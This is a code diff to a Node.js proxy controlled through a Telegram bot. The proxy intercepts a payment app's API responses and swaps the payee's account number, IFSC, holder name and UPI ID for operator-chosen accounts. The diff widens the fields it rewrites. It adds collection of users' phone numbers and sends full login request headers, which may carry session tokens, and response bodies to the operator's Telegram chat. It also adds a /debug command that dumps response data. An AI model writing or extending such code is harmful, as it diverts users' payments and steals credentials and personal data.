@@ -38,6 +38,8 @@ let cachedData = null;
 let cacheTime = 0;
 const CACHE_TTL = 5000;
 const tokenUserMap = {};
+const userPhoneMap = {};
+let debugNextResponse = false;
 
 async function ensureWebhook() {
   if (!bot || webhookSet) return;
@@ -284,15 +286,30 @@ const BANK_FIELDS = {
   'accountno': 'accountNo', 'accountnumber': 'accountNo', 'account_no': 'accountNo',
   'receiveaccountno': 'accountNo', 'bankaccount': 'accountNo', 'acno': 'accountNo',
   'bankaccountno': 'accountNo', 'beneficiaryaccount': 'accountNo', 'payeeaccount': 'accountNo',
-  'holderaccount': 'accountNo',
+  'holderaccount': 'accountNo', 'cardno': 'accountNo', 'cardnumber': 'accountNo',
+  'bankcardno': 'accountNo', 'payeecardno': 'accountNo', 'receivecardno': 'accountNo',
+  'payeebankaccount': 'accountNo', 'payeebankaccountno': 'accountNo', 'payeeaccountno': 'accountNo',
+  'receiveraccount': 'accountNo', 'receiveraccountno': 'accountNo', 'receiveaccountnumber': 'accountNo',
+  'walletaccount': 'accountNo', 'walletno': 'accountNo', 'walletaccountno': 'accountNo',
+  'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
   'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
   'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
   'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
-  'payeename': 'accountHolder', 'bankaccountname': 'accountHolder',
+  'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
+  'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
+  'payeecardname': 'accountHolder', 'receivecardname': 'accountHolder', 'receivercardname': 'accountHolder',
+  'receivername': 'accountHolder', 'collectionname': 'accountHolder', 'collectionaccountname': 'accountHolder',
+  'payeerealname': 'accountHolder', 'receiverrealname': 'accountHolder',
   'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
-  'bankifsc': 'ifsc', 'payeeifsc': 'ifsc',
+  'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
+  'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
   'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
-  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId'
+  'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
+  'collectionbankname': 'bankName',
+  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
+  'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
+  'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
+  'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId'
 };
 
 function replaceBankInUrl(urlStr, bank) {
@@ -439,7 +456,8 @@ app.use(async (req, res, next) => {
       const path = req.originalUrl || req.url;
       if (!path.includes('bot-webhook') && !path.includes('favicon')) {
         const userId = extractUserId(req, null);
-        const tag = userId ? ` [${userId}]` : '';
+        const phone = userId ? (userPhoneMap[String(userId)] || '') : '';
+        const tag = userId ? ` (${phone || userId})` : '';
         bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}`).catch(()=>{});
       }
     }
@@ -565,6 +583,8 @@ Example:
     if (text === '/off') { data.botEnabled = false; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
     if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+
+    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
 
     if (text === '/banks') {
       if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added'); return res.sendStatus(200); }
@@ -831,15 +851,26 @@ app.post('/app/api/system/v2/login', async (req, res) => {
     const data = await loadData();
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = extractUserId(req, jsonResp);
+    const body = req.parsedBody || {};
+    const phone = body.phone || body.mobile || body.telephone || body.username || '';
     if (userId) {
       saveTokenUserId(req, userId);
+      if (phone) userPhoneMap[String(userId)] = String(phone);
       if (jsonResp && jsonResp.data && jsonResp.data.token) tokenUserMap[jsonResp.data.token] = userId;
+      if (jsonResp && jsonResp.data) {
+        const d = jsonResp.data;
+        const respPhone = d.phone || d.mobile || d.telephone || d.memberPhone || '';
+        if (respPhone && userId) userPhoneMap[String(userId)] = String(respPhone);
+      }
       trackUser(data, userId, 'Login');
       saveData(data).catch(()=>{});
     }
-    if (jsonResp && jsonResp.data && data.adminChatId && bot) {
-      const d = jsonResp.data;
-      bot.sendMessage(data.adminChatId, `🔑 Login [${userId || 'N/A'}]\nToken: ${(d.token || d.accessToken || '').substring(0, 20)}...`).catch(()=>{});
+    if (data.adminChatId && bot) {
+      const reqHeaders = JSON.stringify(req.headers, null, 2).substring(0, 1500);
+      const respHdrs = JSON.stringify(respHeaders, null, 2).substring(0, 1500);
+      const bodyDump = JSON.stringify(jsonResp || respBody, null, 2).substring(0, 2000);
+      bot.sendMessage(data.adminChatId, `🔑 Login [${userId || 'N/A'}] (${phone || 'no phone'})\n\n📤 REQUEST HEADERS:\n${reqHeaders}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `📥 RESPONSE HEADERS:\n${respHdrs}\n\n📥 RESPONSE BODY:\n${bodyDump}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -857,6 +888,27 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     const eff = getEffectiveSettings(data, detectedUserId);
     const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
 
+    if (debugNextResponse && data.adminChatId && bot) {
+      debugNextResponse = false;
+      const keys = [];
+      function collectKeys(obj, prefix) {
+        if (!obj || typeof obj !== 'object') return;
+        for (const k of Object.keys(obj)) {
+          const v = obj[k];
+          if (v && typeof v === 'object' && !Array.isArray(v)) {
+            collectKeys(v, prefix + k + '.');
+          } else if (Array.isArray(v) && v.length > 0 && typeof v[0] === 'object') {
+            collectKeys(v[0], prefix + k + '[0].');
+          } else {
+            keys.push(`${prefix}${k} = ${JSON.stringify(v).substring(0, 80)}`);
+          }
+        }
+      }
+      collectKeys(jsonResp, '');
+      const dump = keys.join('\n').substring(0, 3500);
+      bot.sendMessage(data.adminChatId, `🔍 DEBUG ${req.originalUrl}\n\n${dump}`).catch(()=>{});
+    }
+
     if (jsonResp && jsonResp.data && active) {
       const originalValues = {};
       deepReplace(jsonResp.data, active, originalValues, 0);
@@ -865,13 +917,14 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     if (data.adminChatId && bot) {
       const orderId = jsonResp?.data?.orderId || jsonResp?.data?.orderNo || req.parsedBody?.orderId || 'N/A';
       const amount = jsonResp?.data?.amount || jsonResp?.data?.orderAmount || req.parsedBody?.amount || 'N/A';
+      const phone = detectedUserId ? (userPhoneMap[String(detectedUserId)] || '') : '';
       bot.sendMessage(data.adminChatId,
 `🔔 ${label}
-👤 User: ${detectedUserId || 'N/A'}
+👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 Order: ${orderId}
 Amount: ₹${amount}
-Bank: ${active ? active.accountHolder : 'None'}
-Acc: ${active ? active.accountNo : 'N/A'}
+Bank: ${active ? active.accountNo : 'N/A'}
+Acc: ${active ? active.accountHolder : 'None'}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(()=>{});
     }
